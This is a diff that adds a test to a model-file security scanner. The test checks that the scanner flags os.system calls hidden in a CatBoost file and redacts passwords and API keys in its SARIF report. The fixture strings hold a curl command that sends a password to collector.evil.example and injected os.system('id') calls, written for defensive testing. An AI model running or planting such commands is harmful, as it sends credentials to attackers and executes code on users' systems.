@@ -1399,6 +1399,40 @@ def test_catboost_sarif_redacts_dotted_function_argument_and_certificate_secrets
     assert "collector.evil.example" in sarif
 
 
+def test_catboost_sarif_redacts_function_defaults_and_suffixed_aliases(tmp_path: Path) -> None:
+    secrets = ("commandpass7", "defaultpass8", "suffixpass9")
+    model_path = tmp_path / "sarif_function_default_secrets.cbm"
+    model_path.write_bytes(
+        _build_cbm(
+            [
+                (
+                    'config.get("api_key", os.system('
+                    f'"curl --password {secrets[0]} https://collector.evil.example/upload"))'
+                ),
+                f'parser.add_argument("--api-key", required=False, default="{secrets[1]}"); os.system("id")',
+                f'my_api_key_value={secrets[2]} os.system("id")',
+            ],
+        ),
+    )
+
+    result = scan_model_directory_or_file(str(model_path), cache_scan_results=False)
+    failed_details = " ".join(str(check.details) for check in result.checks if check.status == CheckStatus.FAILED)
+    sarif = format_sarif_output(result, [str(model_path)])
+
+    assert determine_exit_code(result) == 1
+    for secret in secrets:
+        assert secret not in failed_details
+        assert secret not in sarif
+    assert "os.system" in failed_details
+    assert "curl --password <redacted>" in failed_details
+    assert 'default="<redacted>"' in failed_details
+    assert "my_api_key_value=<redacted>" in failed_details
+    assert "os.system" in sarif
+    assert "curl --password <redacted>" in sarif
+    assert 'default=\\"<redacted>\\"' in sarif
+    assert "my_api_key_value=<redacted>" in sarif
+
+
 def test_catboost_sarif_redacts_iteratively_encoded_query_secrets(tmp_path: Path) -> None:
     secrets = (
         "ENCODED_KEY_SECRET_123",
